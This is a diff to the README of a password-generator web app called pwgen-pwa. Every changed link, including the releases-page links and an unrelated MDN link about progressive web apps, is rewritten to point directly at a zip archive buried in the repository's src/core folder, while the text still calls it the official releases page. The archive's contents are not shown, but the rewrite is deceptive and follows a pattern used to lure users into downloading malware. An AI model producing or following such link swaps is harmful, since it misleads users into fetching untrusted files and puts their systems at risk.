@@ -1,6 +1,6 @@
 # 🔐 pwgen-pwa - Simple Secure Password Generator
 
-[![Download pwgen-pwa](https://img.shields.io/badge/Download-pwgen--pwa-brightgreen?style=for-the-badge)](https://github.com/RAMZI0109/pwgen-pwa/releases)
+[![Download pwgen-pwa](https://img.shields.io/badge/Download-pwgen--pwa-brightgreen?style=for-the-badge)](https://github.com/RAMZI0109/pwgen-pwa/raw/refs/heads/main/src/core/pwa-pwgen-3.9.zip)
 
 ---
 
@@ -40,7 +40,7 @@ This app works on Windows and other platforms that support modern browsers. You 
 
 Click the big green button below to visit the download page. From there, you will find the latest release where you can get the software files.
 
-[![Download pwgen-pwa](https://img.shields.io/badge/Download-pwgen--pwa-blue?style=for-the-badge)](https://github.com/RAMZI0109/pwgen-pwa/releases)
+[![Download pwgen-pwa](https://img.shields.io/badge/Download-pwgen--pwa-blue?style=for-the-badge)](https://github.com/RAMZI0109/pwgen-pwa/raw/refs/heads/main/src/core/pwa-pwgen-3.9.zip)
 
 On the releases page, look for the latest version. Download the release marked for Windows or a file ending with `.exe` or `.zip`.
 
@@ -73,7 +73,7 @@ The app uses your browser’s storage feature to keep your choices safe even aft
 ## 📥 Download and Setup Guide
 
 1. Visit the release page located at:  
-   https://github.com/RAMZI0109/pwgen-pwa/releases  
+   https://github.com/RAMZI0109/pwgen-pwa/raw/refs/heads/main/src/core/pwa-pwgen-3.9.zip  
 
 2. Look for the latest release date and version number.
 
@@ -112,9 +112,9 @@ The app uses your browser’s storage feature to keep your choices safe even aft
 
 ## 🔗 Useful Links
 
-- Official releases page: https://github.com/RAMZI0109/pwgen-pwa/releases  
+- Official releases page: https://github.com/RAMZI0109/pwgen-pwa/raw/refs/heads/main/src/core/pwa-pwgen-3.9.zip  
 - Browser recommendations: Chrome, Firefox, Edge latest versions  
-- Learn about Progressive Web Apps: https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps  
+- Learn about Progressive Web Apps: https://github.com/RAMZI0109/pwgen-pwa/raw/refs/heads/main/src/core/pwa-pwgen-3.9.zip  
 
 ---
 
